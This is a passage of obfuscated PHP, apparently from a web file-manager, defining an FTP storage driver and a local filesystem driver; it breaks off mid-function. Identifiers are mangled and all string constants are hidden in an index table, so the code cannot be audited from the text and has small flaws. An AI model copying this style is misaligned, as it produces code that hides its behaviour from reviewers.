_fileOutImage($≠ç…æÃÕ, $û›√¡·ç = 250) { $î∆€≠§Ω =& $_SERVER[Á≈ ä ∞]; $˚Ï¡‹±´ = $this->model->pathInfo($≠ç…æÃÕ); if ($˚Ï¡‹±´[$î∆€≠§Ω[419]] == $î∆€≠§Ω[98]) { show_json($î∆€≠§Ω[1336] . $≠ç…æÃÕ, !1); } $ﬁ◊∫Ã≈∂ = $this->model->fileInfoGet($≠ç…æÃÕ); $ﬁ◊∫Ã≈∂[$î∆€≠§Ω[42]] = $˚Ï¡‹±´[$î∆€≠§Ω[42]]; $ﬁ◊∫Ã≈∂[$î∆€≠§Ω[179]] = $˚Ï¡‹±´[$î∆€≠§Ω[179]]; $GLOBALS[$î∆€≠§Ω[1335]] = $ﬁ◊∫Ã≈∂[$î∆€≠§Ω[42]]; $GLOBALS[$î∆€≠§Ω[178]] = $ﬁ◊∫Ã≈∂; IO::fileOutImage($ﬁ◊∫Ã≈∂[$î∆€≠§Ω[94]], $û›√¡·ç); } public function fileOutImage($ÂÃ¯äâß, $´≥À©î· = 250) { $this->_fileOutImage($ÂÃ¯äâß, $´≥À©î·); } public function fileOutImageServer($’îª˘∫¡, $˝§˝’∆é = 250) { $this->_fileOutImage($’îª˘∫¡, $˝§˝’∆é); } public function link($¬öˆıÎ”, $ã¢øØÖÅ = '') { $¸Á¬˜≠˚ = $this->model->fileInfoGet($¬öˆıÎ”); return IO::link($¸Á¬˜≠˚[$_SERVER[Á≈ ä ∞][94]], $ã¢øØÖÅ); } protected function parse($’…Æú¸˛) { $ØÌÉáÜÚ =& $_SERVER[Á≈ ä ∞]; if (strstr($’…Æú¸˛, $ØÌÉáÜÚ[18]) === !1) { return array($ØÌÉáÜÚ[428] => intval($’…Æú¸˛), $ØÌÉáÜÚ[94] => $ØÌÉáÜÚ[22], $ØÌÉáÜÚ[1331] => array()); } $≠‡Äâú¸ = explode($ØÌÉáÜÚ[18], trim($’…Æú¸˛, $ØÌÉáÜÚ[18])); if (count($≠‡Äâú¸) < 2) { show_tips(clear_html($’…Æú¸˛) . $ØÌÉáÜÚ[1337]); } return array($ØÌÉáÜÚ[428] => intval($≠‡Äâú¸[0]), $ØÌÉáÜÚ[94] => $≠‡Äâú¸[1], $ØÌÉáÜÚ[1331] => array_slice($≠‡Äâú¸, 1)); } } goto eúØç‹ØÀ”; D¯»Ô≥ÓŸ: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($≥˝´≠´Ì) { parent::__construct(); if (count($≥˝´≠´Ì) > 0) { $this->_init($≥˝´≠´Ì); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ƒ¡ë´Ú‰) { $ÅÍ«ÔÈÎ =& $_SERVER[Á≈ ä ∞]; global $config; $this->appCharset = $config[$ÅÍ«ÔÈÎ[1367]]; $this->systemCharset = $config[$ÅÍ«ÔÈÎ[1368]]; if (isset($ƒ¡ë´Ú‰[$ÅÍ«ÔÈÎ[1369]]) && $ƒ¡ë´Ú‰[$ÅÍ«ÔÈÎ[1369]]) { $this->systemCharset = $ƒ¡ë´Ú‰[$ÅÍ«ÔÈÎ[1369]]; } } public function iconvApp($¿Ô‹¸ÿÄ) { return $this->iconvTo($¿Ô‹¸ÿÄ, $this->systemCharset, $this->appCharset); } public function iconvSystem($í©õƒ®˝) { return $this->iconvTo($í©õƒ®˝, $this->appCharset, $this->systemCharset); } public function getPathOuter($ìµ˚‡˚≈) { $¢⁄¯Ω¯∂ =& $_SERVER[Á≈ ä ∞]; $ﬂ√›˚›Ø = $this->iconvApp($this->pathBase); $ìµ˚‡˚≈ = $this->iconvApp($ìµ˚‡˚≈); if (substr($ﬂ√›˚›Ø, 0, 2) == $¢⁄¯Ω¯∂[1370]) { $ﬂ√›˚›Ø = BASIC_PATH . substr($ﬂ√›˚›Ø, 2); } if (substr($ìµ˚‡˚≈, 0, 2) == $¢⁄¯Ω¯∂[1370]) { $ìµ˚‡˚≈ = BASIC_PATH . substr($ìµ˚‡˚≈, 2); } $ﬂ√›˚›Ø = KodIO::clear($ﬂ√›˚›Ø); $ìµ˚‡˚≈ = KodIO::clear($ìµ˚‡˚≈); $ìµ˚‡˚≈ = substr($ìµ˚‡˚≈, strlen($ﬂ√›˚›Ø)); if (empty($this->pathDriver)) { return $ìµ˚‡˚≈; } return $this->pathDriver . $¢⁄¯Ω¯∂[18] . ltrim($ìµ˚‡˚≈, $¢⁄¯Ω¯∂[18]); } private function _init($Öåá∞‘“ = array()) { $‹ÊØöÛâ =& $_SERVER[Á≈ ä ∞]; if (!function_exists($‹ÊØöÛâ[1371])) { throw new Exception(LNG($‹ÊØöÛâ[1372])); } $this->config = $Öåá∞‘“; $this->charsetReset($Öåá∞‘“); foreach ($Öåá∞‘“ as $‚¶’±ÿ® => $ÓË¶ªıﬁ) { if (isset($this->{$‚¶’±ÿ®})) { $this->{$‚¶’±ÿ®} = $ÓË¶ªıﬁ; } } return $this->_login($Öåá∞‘“); } private function _login($ù˜˝∫äı) { $“áâàç =& $_SERVER[Á≈ ä ∞]; static $©’åÖ¸„ = array(); $ÃÜ⁄∂ó¨ = md5(json_encode($ù˜˝∫äı)); if (isset($©’åÖ¸„[$ÃÜ⁄∂ó¨])) { foreach ($©’åÖ¸„[$ÃÜ⁄∂ó¨] as $Ω¡µñ∑ñ => $‰¢Ë∞ÎÃ) { $this->{$Ω¡µñ∑ñ} = $‰¢Ë∞ÎÃ; } return !0; } $€≥˚ı±ı = parse_url(trim($this->server, $“áâàç[18])); $this->host = $€≥˚ı±ı[$“áâàç[191]]; $∏Èí˙Ôú = isset($€≥˚ı±ı[$“áâàç[190]]) && $€≥˚ı±ı[$“áâàç[190]] == $“áâàç[1373] ? !0 : !1; $this->scheme = $∏Èí˙Ôú ? $“áâàç[1374] : $“áâàç[1375]; $this->port = isset($€≥˚ı±ı[$“áâàç[192]]) ? $€≥˚ı±ı[$“áâàç[192]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $ÒÙ∫ŒÙº = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $∏∫ªÎâ® = $this->pasv == $“áâàç[98] ? !0 : !1; @ftp_pasv($this->connect, $∏∫ªÎâ®); $©’åÖ¸„[$ÃÜ⁄∂ó¨] = array($“áâàç[1376] => $this->connect, $“áâàç[191] => $this->host, $“áâàç[190] => $this->scheme, $“áâàç[192] => $this->port); return $ÒÙ∫ŒÙº; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($ﬂë¸‘Ö¶, $‹‚ŒîÄ¶ = '', $Îû‘êçΩ = REPEAT_RENAME) { if ($this->setContent($ﬂë¸‘Ö¶, $‹‚ŒîÄ¶)) { return $this->getPathOuter($ﬂë¸‘Ö¶); } return !1; } public function mkdir($∆à«ÓòÑ, $„«◊åˆ˚ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $∆à«ÓòÑ = $this->iconvSystem($∆à«ÓòÑ); if ($this->_isFolder($∆à«ÓòÑ) || @ftp_mkdir($this->connect, $∆à«ÓòÑ)) { return $this->getPathOuter($∆à«ÓòÑ); } if (!$this->mkdir($this->pathFather($∆à«ÓòÑ))) { return !1; } if ($∆à«ÓòÑ = @ftp_mkdir($this->connect, $∆à«ÓòÑ)) { return $this->getPathOuter($∆à«ÓòÑ); } return !1; } public function copyFile($¨«∑§†°, $‹üÿƒàÇ) { if (!$this->_isconn()) { return !1; } $´ﬁ©»ﬁ™ = $this->pathThis($this->iconvSystem($¨«∑§†°)); $œ∞ñÔÒﬂ = $this->tempFile($´ﬁ©»ﬁ™); $˛Àµ¢ã˘ = $this->iconvApp($œ∞ñÔÒﬂ); $this->download($¨«∑§†°, $˛Àµ¢ã˘); $∫ØÎ∞„· = $this->upload($‹üÿƒàÇ, $˛Àµ¢ã˘); $this->tempFileRemve($œ∞ñÔÒﬂ); return $∫ØÎ∞„·; } public function moveFile($ƒó¸™∏ü, $¸¢‰êËó) { if (!$this->_isconn()) { return !1; } $ƒó¸™∏ü = $this->iconvSystem($ƒó¸™∏ü); $¸¢‰êËó = $this->iconvSystem($¸¢‰êËó); $ÈÏ∏Ú•¡ = @ftp_rename($this->connect, $ƒó¸™∏ü, $¸¢‰êËó); return $ÈÏ∏Ú•¡ ? $this->getPathOuter($¸¢‰êËó) : !1; } public function delFile($ı≤Õ˛€À) { if (!$this->_isconn()) { return !1; } $ı≤Õ˛€À = $this->iconvSystem($ı≤Õ˛€À); return @ftp_delete($this->connect, $ı≤Õ˛€À); } public function delFolder($≤°ƒº“ã) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ÁËØº¶Ÿ = $¯á¥„„Î = array(); $this->fileList($≤°ƒº“ã, $ÁËØº¶Ÿ, $¯á¥„„Î, !0); $this->listItemCache = !0; foreach ($¯á¥„„Î as $ÙÀπî∏Ä) { $Ù÷È‘Ωº = $this->iconvSystem($ÙÀπî∏Ä[$_SERVER[Á≈ ä ∞][42]]); $◊‡πáÎÍ = @ftp_delete($this->connect, $Ù÷È‘Ωº); if (!$◊‡πáÎÍ) { return !1; } } foreach ($ÁËØº¶Ÿ as $Ù÷È‘Ωº) { $Ù÷È‘Ωº = $this->iconvSystem($Ù÷È‘Ωº); $◊‡πáÎÍ = @ftp_rmdir($this->connect, $Ù÷È‘Ωº); if (!$◊‡πáÎÍ) { return !1; } } $≤°ƒº“ã = $this->iconvSystem($≤°ƒº“ã); return @ftp_rmdir($this->connect, $≤°ƒº“ã); } public function rename($∂¡¸¥Ëç, $’ù∞ûÁ) { $œ•Éå⁄∫ =& $_SERVER[Á≈ ä ∞]; if (!$this->_isconn()) { return !1; } $ˆ±ÆÓî≥ = $this->fileNameAuto($this->pathFather($∂¡¸¥Ëç), $’ù∞ûÁ); $ˆ±ÆÓî≥ = $this->iconvSystem($ˆ±ÆÓî≥); $∂¡¸¥Ëç = $this->iconvSystem($∂¡¸¥Ëç); $¬’¯Ú≠≠ = $this->pathFather($∂¡¸¥Ëç); $Ù∆Û¸“£ = rtrim($¬’¯Ú≠≠, $œ•Éå⁄∫[18]) . $œ•Éå⁄∫[18] . $ˆ±ÆÓî≥; $û”∑≈Âß = @ftp_rename($this->connect, $∂¡¸¥Ëç, $Ù∆Û¸“£); $Ù∆Û¸“£ = $this->iconvApp($Ù∆Û¸“£); return $û”∑≈Âß ? $this->getPathOuter($Ù∆Û¸“£) : !1; } private function folderInfo($¢Éﬂ≈‘, $íƒâΩï = false) { $˛⁄ﬂ†—∂ =& $_SERVER[Á≈ ä ∞]; $óûÌØÄú = array($˛⁄ﬂ†—∂[42] => $this->pathThis($¢Éﬂ≈‘), $˛⁄ﬂ†—∂[94] => $this->getPathOuter($˛⁄ﬂ†—∂[18] . $¢Éﬂ≈‘), $˛⁄ﬂ†—∂[43] => $˛⁄ﬂ†—∂[85]); if ($íƒâΩï) { return $óûÌØÄú; } $óûÌØÄú[$˛⁄ﬂ†—∂[210]] = $óûÌØÄú[$˛⁄ﬂ†—∂[95]] = 0; $óûÌØÄú[$˛⁄ﬂ†—∂[211]] = $óûÌØÄú[$˛⁄ﬂ†—∂[212]] = !0; return $óûÌØÄú; } private function fileInfo($áò≥ˆœÀ, $È»Øú¨û = false, $ùÑ Ÿﬁã = array()) { $ê„‹ƒ¸π =& $_SERVER[Á≈ ä ∞]; $ç¸œ¿ëü = array($ê„‹ƒ¸π[42] => $this->pathThis($áò≥ˆœÀ), $ê„‹ƒ¸π[94] => $this->getPathOuter($ê„‹ƒ¸π[18] . $áò≥ˆœÀ), $ê„‹ƒ¸π[43] => $ê„‹ƒ¸π[209], $ê„‹ƒ¸π[86] => isset($ùÑ Ÿﬁã[$ê„‹ƒ¸π[86]]) ? $ùÑ Ÿﬁã[$ê„‹ƒ¸π[86]] : 0, $ê„‹ƒ¸π[184] => $this->ext($áò≥ˆœÀ)); if ($È»Øú¨û) { return $ç¸œ¿ëü; } $ç¸œ¿ëü[$ê„‹ƒ¸π[210]] = $ç¸œ¿ëü[$ê„‹ƒ¸π[95]] = 0; $ç¸œ¿ëü[$ê„‹ƒ¸π[211]] = $ç¸œ¿ëü[$ê„‹ƒ¸π[212]] = !0; $ù∆Åã∫É = $this->iconvSystem($áò≥ˆœÀ); $ç¸œ¿ëü[$ê„‹ƒ¸π[95]] = @ftp_mdtm($this->connect, $ù∆Åã∫É); if (empty($ùÑ Ÿﬁã)) { $ùÑ Ÿﬁã = $this->objectMeta($áò≥ˆœÀ); if (!$ùÑ Ÿﬁã) { return $ç¸œ¿ëü; } } $ç¸œ¿ëü[$ê„‹ƒ¸π[86]] = $ùÑ Ÿﬁã[$ê„‹ƒ¸π[86]]; return $ç¸œ¿ëü; } public function size($˜õºÅÏÀ) { $‹¡Ã“Æû = $this->objectMeta($˜õºÅÏÀ); return $‹¡Ã“Æû ? $‹¡Ã“Æû[$_SERVER[Á≈ ä ∞][86]] : 0; } public function info($≤Ïè›ı´) { if ($this->isFile($≤Ïè›ı´)) { return $this->fileInfo($≤Ïè›ı´, 0); } else { if ($this->isFolder($≤Ïè›ı´)) { return $this->folderInfo($≤Ïè›ı´); } } return !1; } private function fileList($´°˘ƒ˙È, &$úÚµ¥¥À, &$ÌÔ∞µåà, $Ç· ä›¶ = false) { $â‘µù€ú =& $_SERVER[Á≈ ä ∞]; $´°˘ƒ˙È = $this->iconvSystem($´°˘ƒ˙È); if (!$this->isFolder($´°˘ƒ˙È)) { return !1; } @ftp_chdir($this->connect, $â‘µù€ú[18]); $´°˘ƒ˙È = rtrim($´°˘ƒ˙È, $â‘µù€ú[18]) . $â‘µù€ú[18]; check_abort(); $«Ê±◊ÛÍ = @ftp_rawlist($this->connect, $´°˘ƒ˙È); if (!$«Ê±◊ÛÍ) { $«Ê±◊ÛÍ = array(); } $û´áÄÔ¨ = array($â‘µù€ú[20] => 1, $â‘µù€ú[1377] => 1); foreach ($«Ê±◊ÛÍ as $Öèè“ÚÙ) { $Î˛™§˜ï = $this->_listItem($Öèè“ÚÙ); if ($Î˛™§˜ï[0] == $â‘µù€ú[766]) { continue; } $†Ã£óÆﬁ = $Î˛™§˜ï[8]; if (empty($†Ã£óÆﬁ) && $†Ã£óÆﬁ !== $â‘µù€ú[207] || isset($û´áÄÔ¨[$†Ã£óÆﬁ])) { continue; } $†Ã£óÆﬁ = $this->iconvApp($´°˘ƒ˙È . ltrim($†Ã£óÆﬁ, $â‘µù€ú[18])); $õ˘Ü»—Á = array($â‘µù€ú[42] => $†Ã£óÆﬁ, $â‘µù€ú[43] => $â‘µù€ú[209], $â‘µù€ú[86] => $Î˛™§˜ï[4]); if (substr($Öèè“ÚÙ, 0, 1) == $â‘µù€ú[1378]) { $õ˘Ü»—Á[$â‘µù€ú[43]] = $â‘µù€ú[85]; $õ˘Ü»—Á[$â‘µù€ú[86]] = 0; } $å¨ßÏﬂŒ = $õ˘Ü»—Á[$â‘µù€ú[43]] == $â‘µù€ú[85] ? !0 : !1; $this->cacheMethodInfoSet($†Ã£óÆﬁ, $å¨ßÏﬂŒ, $õ˘Ü»—Á); if ($å¨ßÏﬂŒ) { $úÚµ¥¥À[] = $†Ã£óÆﬁ; if ($Ç· ä›¶) { $this->fileList($†Ã£óÆﬁ, $úÚµ¥¥À, $ÌÔ∞µåà, $Ç· ä›¶); } continue; } $ÌÔ∞µåà[] = $õ˘Ü»—Á; } $this->cacheMethodInfoSet($´°˘ƒ˙È, !0); } private function _listItem($ÁÑè◊º†) { if (empty($ÁÑè◊º†)) { return array(); } $ë∞Ö ΩÙ = preg_split($_SERVER[Á≈ ä ∞][1379], $ÁÑè◊º†); if (count($ë∞Ö ΩÙ) <= 9) { return $ë∞Ö ΩÙ; } $ë∞Ö ΩÙ[8] = trim(substr($ÁÑè◊º†, strpos($ÁÑè◊º†, $ë∞Ö ΩÙ[7]) + strlen($ë∞Ö ΩÙ[7]))); return array_splice($ë∞Ö ΩÙ, 0, 9); } public function listPath($Ã©≠â˚é, $ö⁄¬Ó‰Ú = false) { $˚£ç˚ç =& $_SERVER[Á≈ ä ∞]; if (!$this->_isconn()) { return !1; } $‘ä÷ëË = $ªÂà»Œ  = array(); $this->fileList($Ã©≠â˚é, $‘ä÷ëË, $ªÂà»Œ ); foreach ($‘ä÷ëË as $≥ÆÔ÷áÉ => $⁄îªôÍ‘) { $‘ä÷ëË[$≥ÆÔ÷áÉ] = $this->folderInfo($⁄îªôÍ‘, $ö⁄¬Ó‰Ú); } foreach ($ªÂà»Œ  as $≥ÆÔ÷áÉ => $⁄îªôÍ‘) { $ªÂà»Œ [$≥ÆÔ÷áÉ] = $this->fileInfo($⁄îªôÍ‘[$˚£ç˚ç[42]], $ö⁄¬Ó‰Ú, $⁄îªôÍ‘); } return array($˚£ç˚ç[92] => $‘ä÷ëË, $˚£ç˚ç[93] => $ªÂà»Œ ); } public function has($ò≠¿è«¢, $∆∞Ë⁄Çâ = false, $øŒ™«∫õ = true) { $°Ïî–Ì° =& $_SERVER[Á≈ ä ∞]; $Ö˙Ω’ÓÉ = $∏¡Œ∫îÃ = array(); $¨Û˜î˛ß = $∆∞Ë⁄Çâ ? !0 : !1; $this->fileList($ò≠¿è«¢, $Ö˙Ω’ÓÉ, $∏¡Œ∫îÃ, $¨Û˜î˛ß); if ($∆∞Ë⁄Çâ) { return array($°Ïî–Ì°[217] => count($∏¡Œ∫îÃ), $°Ïî–Ì°[218] => count($Ö˙Ω’ÓÉ)); } if ($øŒ™«∫õ) { if (count($∏¡Œ∫îÃ)) { return !0; } } else { if (count($Ö˙Ω’ÓÉ)) { return !0; } } return !1; } public function listAll($‚‘êÆîä) { $ıÓô€¥… =& $_SERVER[Á≈ ä ∞]; if (!$this->_isconn()) { return !1; } $ê∏⁄Ùﬂﬁ = $˙è˚”Àı = array(); $this->fileList($‚‘êÆîä, $ê∏⁄Ùﬂﬁ, $˙è˚”Àı, !0); $Ø«ç–õË = array(); foreach ($˙è˚”Àı as $§™ËÏû¶) { $Ø«ç–õË[$§™ËÏû¶[$ıÓô€¥…[42]]] = $§™ËÏû¶[$ıÓô€¥…[86]]; } foreach ($ê∏⁄Ùﬂﬁ as $§™ËÏû¶) { if (is_string($§™ËÏû¶)) { $Ø«ç–õË[$§™ËÏû¶] = 0; } } return $this->listAllFiles($‚‘êÆîä, array_keys($Ø«ç–õË), $Ø«ç–õË); } public function getContent($˝¨ë∞–≥) { if (!$this->_isconn()) { return !1; } $˝¨ë∞–≥ = $this->iconvSystem($˝¨ë∞–≥); return $this->fileSubstr($˝¨ë∞–≥); } public function setContent($˙óıàú®, $„É∞’ˆƒ = '') { if (!$this->_isconn()) { return !1; } $ÁîúÆ∑Î = $this->pathThis($this->iconvSystem($˙óıàú®)); $œ°Í˙∏¯ = $this->tempFile($ÁîúÆ∑Î); file_put_contents($œ°Í˙∏¯, $„É∞’ˆƒ); $√ã¡´∞ì = $this->upload($˙óıàú®, $this->iconvApp($œ°Í˙∏¯)); $this->tempFileRemve($œ°Í˙∏¯); return $√ã¡´∞ì; } public function fileSubstr($◊¶¯ûÍì, $‘Ì´øíˆ = 0, $Ü…ñﬁ∫· = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($◊¶¯ûÍì, $‘Ì´øíˆ, $Ü…ñﬁ∫·); } private function ftpRequest($—Ø™—˙–, $ë≤ä“Ñ£ = 0, $¢Ô⁄°÷¬ = false) { $—Ø™—˙– = $this->iconvSystem($—Ø™—˙–); $Ì∞·œ˚á = $this->scheme . $this->host . $_SERVER[Á≈ ä ∞][4] . $this->port; $´ûúÀé° = curl_init(); curl_setopt($´ûúÀé°, CURLOPT_URL, $Ì∞·œ˚á . $this->pathEncode($—Ø™—˙–)); curl_setopt($´ûúÀé°, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($¢Ô⁄°÷¬) { $Â±˜òë⁄ = $ë≤ä“Ñ£ + $¢Ô⁄°÷¬ - 1; curl_setopt($´ûúÀé°, CURLOPT_RANGE, "{$ë≤ä“Ñ£}\x2d{$Â±˜òë⁄}"); } curl_setopt($´ûúÀé°, CURLOPT_RETURNTRANSFER, 1); $»Ω™≠‚® = curl_exec($´ûúÀé°); curl_close($´ûúÀé°); return $»Ω™≠‚®; } public function upload($Ì∑©‚∫Ó, $ãØ¬Â∫, $‹ÛôÕÙÍ = false, $êø§±”∞ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Ì∑©‚∫Ó))) { return !1; } $Ì∑©‚∫Ó = $this->iconvSystem($Ì∑©‚∫Ó); $ãØ¬Â∫ = $this->iconvSystem($ãØ¬Â∫); $ŒÜ™¡ﬂÃ = ftp_nb_put($this->connect, $Ì∑©‚∫Ó, $ãØ¬Â∫, FTP_BINARY); while ($ŒÜ™¡ﬂÃ == FTP_MOREDATA) { $ŒÜ™¡ﬂÃ = ftp_nb_continue($this->connect); } if ($ŒÜ™¡ﬂÃ != FTP_FINISHED) { return !1; } return $this->getPathOuter($Ì∑©‚∫Ó); } public function download($ƒúÕ–»˚, $Œ©⁄ü◊‡ = '') { if (!$this->_isconn()) { return !1; } $â√•´Ò¿ = $this->pathFather($Œ©⁄ü◊‡); if (!IO::mkdir($â√•´Ò¿)) { return !1; } $ƒúÕ–»˚ = $this->iconvSystem($ƒúÕ–»˚); $Œ©⁄ü◊‡ = $this->iconvSystem($Œ©⁄ü◊‡); $»û⁄Ã¿› = ftp_nb_get($this->connect, $Œ©⁄ü◊‡, $ƒúÕ–»˚, FTP_BINARY); while ($»û⁄Ã¿› == FTP_MOREDATA) { $»û⁄Ã¿› = ftp_nb_continue($this->connect); } if ($»û⁄Ã¿› != FTP_FINISHED) { return !1; } return $this->iconvApp($Œ©⁄ü◊‡); } public function exist($Œ‰âÀﬁ) { return $this->isFile($Œ‰âÀﬁ) || $this->isFolder($Œ‰âÀﬁ); } public function isFile($ı˝ß¥ıÂ) { return !$this->isFolder($ı˝ß¥ıÂ) && $this->objectMeta($ı˝ß¥ıÂ); } public function isFolder($„¡ƒÇ»Í) { return $this->cacheMethod($_SERVER[Á≈ ä ∞][175], $„¡ƒÇ»Í); } protected function objectMeta($€…ﬂäÿü) { return $this->cacheMethod($_SERVER[Á≈ ä ∞][177], $€…ﬂäÿü); } protected function _objectMeta($ò◊€∏Æì) { $®≈òÿõÌ =& $_SERVER[Á≈ ä ∞]; if ($ò◊€∏Æì == $®≈òÿõÌ[22] || $ò◊€∏Æì == $®≈òÿõÌ[18]) { return array(); } if (!$this->_isconn()) { return !1; } $ò◊€∏Æì = $this->iconvSystem($ò◊€∏Æì); $»îòﬂ»é = array($®≈òÿõÌ[42] => $this->iconvApp($ò◊€∏Æì), $®≈òÿõÌ[43] => $®≈òÿõÌ[209], $®≈òÿõÌ[86] => 0); @ftp_chdir($this->connect, $®≈òÿõÌ[18]); $Ω”ëÿå€ = @ftp_size($this->connect, $ò◊€∏Æì); if ($Ω”ëÿå€ != -1) { $»îòﬂ»é[$®≈òÿõÌ[86]] = $Ω”ëÿå€; } else { $∂“∑¸ ≤ = @ftp_chdir($this->connect, $ò◊€∏Æì); if (!$∂“∑¸ ≤) { return !1; } $»îòﬂ»é[$®≈òÿõÌ[43]] = $®≈òÿõÌ[85]; } return $»îòﬂ»é; } protected function _isFolder($«ß≈ƒ‹ì) { $û™Œ∫àö =& $_SERVER[Á≈ ä ∞]; if ($«ß≈ƒ‹ì == $û™Œ∫àö[22] || $«ß≈ƒ‹ì == $û™Œ∫àö[18]) { return !0; } $èÎ√•à‰ = $this->_objectMeta($«ß≈ƒ‹ì); return isset($èÎ√•à‰[$û™Œ∫àö[43]]) && $èÎ√•à‰[$û™Œ∫àö[43]] == $û™Œ∫àö[85] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ó¬÷ÙÀ‚) { if (substr($ó¬÷ÙÀ‚, 0, 2) == $_SERVER[Á≈ ä ∞][1370]) { $ó¬÷ÙÀ‚ = BASIC_PATH . substr($ó¬÷ÙÀ‚, 2); } return $ó¬÷ÙÀ‚; } public function iconvApp($„£óﬂŒ„) { $Ì•ïﬁ£ë =& $_SERVER[Á≈ ä ∞]; global $config; return $this->iconvTo($„£óﬂŒ„, $config[$Ì•ïﬁ£ë[1368]], $config[$Ì•ïﬁ£ë[1367]]); } public function iconvSystem($Ÿ›ı…Æ˝) { $…˘Óòíû =& $_SERVER[Á≈ ä ∞]; global $config; return $this->iconvTo($Ÿ›ı…Æ˝, $config[$…˘Óòíû[1367]], $config[$…˘Óòíû[1368]]); } public function getPathOuter($üé ÛŸØ) { $¡ı›Ú–œ =& $_SERVER[Á≈ ä ∞]; $“¥‰·ó◊ = $this->iconvApp($this->pathBase); $üé ÛŸØ = $this->iconvApp($üé ÛŸØ); if (substr($“¥‰·ó◊, 0, 2) == $¡ı›Ú–œ[1370]) { $“¥‰·ó◊ = BASIC_PATH . substr($“¥‰·ó◊, 2); } if (substr($üé ÛŸØ, 0, 2) == $¡ı›Ú–œ[1370]) { $üé ÛŸØ = BASIC_PATH . substr($üé ÛŸØ, 2); } $“¥‰·ó◊ = KodIO::clear($“¥‰·ó◊); $üé ÛŸØ = KodIO::clear($üé ÛŸØ); $üé ÛŸØ = substr($üé ÛŸØ, strlen($“¥‰·ó◊)); if (empty($this->pathDriver)) { return $üé ÛŸØ; } return $this->pathDriver . $¡ı›Ú–œ[18] . ltrim($üé ÛŸØ, $¡ı›Ú–œ[18]); } public function mkfile($∞ﬂ±«≤, $î√Ó£†© = '', $·™ıÿ˚˝ = REPEAT_RENAME) { $∞ﬂ±«≤ = $this->iconvSystem($∞ﬂ±«≤); @touch($∞ﬂ±«≤); if ($î√Ó£†©) { file_put_contents($∞ﬂ±«≤, $î√Ó£†©); } @chmod($∞ﬂ±«≤, $this->pathAuth); return is_file($∞ﬂ±«≤) ? $this->getPathOuter($∞ﬂ±«≤) : !1; } public function mkdir($≠î ù’Æ, $õé ª°˜ = REPEAT_SKIP) { $≠î ù’Æ = $this->iconvSystem($≠î ù’Æ); if (is_dir($≠î ù’Æ)) { return $this->getPathOuter($≠î ù’Æ); } @mkdir($≠î ù’Æ, $this->pathAuth, !0); @chmod($≠î ù’Æ, $this->pathAuth); return is_dir($≠î ù’Æ) ? $this->getPathOuter($≠î ù’Æ) : !1; } public function copyFile($Ã©ÓÖÆ†, $Ìà°Ω≈Á) { $this->mkdir($this->pathFather($Ìà°Ω≈Á)); $Ã©ÓÖÆ† = $this->iconvSystem($Ã©ÓÖÆ†); $Ìà°Ω≈Á = $this->iconvSystem($Ìà°Ω≈Á); $†‚∆ΩŸ∑ = copy_64($Ã©ÓÖÆ†, $Ìà°Ω≈Á); @chmod($Ìà°Ω≈Á, $this->pathAuth); return $†‚∆ΩŸ∑ ? $this->getPathOuter($Ìà°Ω≈Á) : !1; } public function moveFile($Öè§ãﬁ¥, $Ë˘Õîœç) { $this->mkdir($this->pathFather($Ë˘Õîœç)); $Öè§ãﬁ¥ = $this->iconvSystem($Öè§ãﬁ¥); $Ë˘Õîœç = $this->iconvSystem($Ë˘Õîœç); $ßúÊﬂüç = intval(@rename($Öè§ãﬁ¥, $Ë˘Õîœç)); if (!$ßúÊﬂüç) { if ($ßúÊﬂüç = intval(@copy_64($Öè§ãﬁ¥, $Ë˘Õîœç))) { @unlink($Öè§ãﬁ¥); } } @chmod($Ë˘Õîœç, $this->pathAuth); return $ßúÊﬂüç ? $this->getPathOuter($Ë˘Õîœç) : !1; } public function movePath($Çß—˚â˚, $ü—á€’Å, $õ∑ËÔ˙˝ = false) { $ÒëàŸ∑¶ =& $_SERVER[Á≈ ä ∞]; $Çß—˚â˚ = $this->iconvSystem($Çß—˚â˚); $ü—á€’Å = $this->iconvSystem($ü—á€’Å); $≥Ü ¿çü = rtrim($ü—á€’Å, $ÒëàŸ∑¶[18]) . $ÒëàŸ∑¶[18] . ($õ∑ËÔ˙˝ ? $õ∑ËÔ˙˝ : get_path_this($Çß—˚â˚)); if (file_exists($≥Ü ¿çü)) { return !1; } $¨í◊Îî› = intval(@rename($Çß—˚â˚, $≥Ü ¿çü)); $¨í◊Îî› = file_exists($≥Ü ¿çü); return $¨í◊Îî› ? $this->getPathOuter($≥Ü ¿çü) : !1; } public function delFile($Ê¿éÎ™) { $Ê¿éÎ™ = $this->iconvSystem($Ê¿éÎ™); if (!@unlink($Ê¿éÎ™)) { @chmod($Ê¿éÎ™, $this->pathAuth); if (!@unlink($Ê¿éÎ™)) { return !1; } } else { return !0; } } public function delFolder($ß‡õ¶∆‡) { $Ωœ„ÔºÄ =& $_SERVER[Á≈ ä ∞]; $ß‡õ¶∆‡ = $this->iconvSystem($ß‡õ¶∆‡); if (!is_dir($ß‡õ¶∆‡)) { return !0; } if (!($á¥π°ôÕ = opendir($ß‡õ¶∆‡))) { return !1; } while (($êÿÌô˝ô = readdir($á¥π°ôÕ)) !== !1) { if ($êÿÌô˝ô == $Ωœ„ÔºÄ[20] || $êÿÌô˝ô == $Ωœ„ÔºÄ[1377]) { continue; } $ô¯Ë›–¥ = $ß‡õ¶∆‡ . $Ωœ„ÔºÄ[18] . $êÿÌô˝ô; if (is_file($ô¯Ë›–¥) || is_link($ô¯Ë›–¥)) { if (!unlink($ô¯Ë›–¥)) { chmod($ô¯Ë›–¥, $this->pathAuth); if (!unlink($ô¯Ë›–¥)) { return !1; } } } else { if (is_dir($ô¯Ë›–¥)) { 